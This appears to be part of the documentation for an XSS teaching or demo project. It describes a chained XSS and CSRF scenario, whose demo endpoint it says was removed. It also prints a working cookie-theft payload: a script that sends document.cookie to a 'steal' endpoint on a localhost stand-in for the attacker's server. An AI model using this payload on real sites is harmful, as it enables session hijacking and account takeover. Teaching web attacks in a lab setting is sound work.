### 1. **Chained XSS + CSRF Attack**

**Scenario:** Use XSS to inject a hidden form that submits a CSRF attack on behalf of the victim.

> Note: The CSRF demo endpoint has been removed from this project. The following section is retained only as a conceptual explanation without a live target.

### 2. stealing cookies:

**Scenario:**  
An attacker injects a script that silently sends the victim's session cookie to a server controlled by the attacker. This is a classic XSS attack used to hijack user sessions.

**Payload:**

<script>
    const img = document.createElement('img'); img.src = 'http://localhost:3000/steal?session=' + document.cookie; document.body.appendChild(img);
</script>

**Explanation:**  
The script creates an image element with its `src` set to a URL containing the user's cookies. When the browser loads the image, it sends a request to the attacker's server with the session cookie in the URL. The attacker can then capture the cookie and use it to impersonate the victim.
